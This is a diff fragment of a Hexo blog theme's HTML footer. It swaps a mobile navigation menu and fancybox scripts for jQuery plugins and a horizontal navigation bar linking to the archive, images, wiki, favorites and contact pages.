+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
   </div>
 </footer>
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
 
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
 
 
-  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-  <script src="/fancybox/jquery.fancybox.pack.js"></script>
 
 
-<script src="/js/script.js"></script>
 
   </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archive"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/2014-10-28-wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/2014-09-11-mabao/"><span>Contact</span></a>
+
+</nav>
+
+</div>
 </body>
 </html>
